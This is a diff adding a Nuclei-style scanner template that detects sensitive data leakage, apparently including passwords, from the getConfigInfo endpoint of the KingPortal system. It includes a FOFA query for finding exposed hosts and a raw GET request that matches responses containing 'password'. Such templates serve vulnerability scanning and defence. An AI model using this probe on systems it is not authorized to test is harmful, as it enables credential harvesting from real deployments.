@@ -1,0 +1,24 @@
+id: kingportal-getconfiginfo-info-leak
+
+info:
+  name: "KingPortal开发系统getConfigInfo接口敏感数据泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="KingPortal"
+      KingPortal开发系统通过getConfigInfo接口可能导致敏感数据泄露
+  tags: KingPortal
+
+http:
+- raw:
+  - |
+    GET /getConfigInfo HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'password'
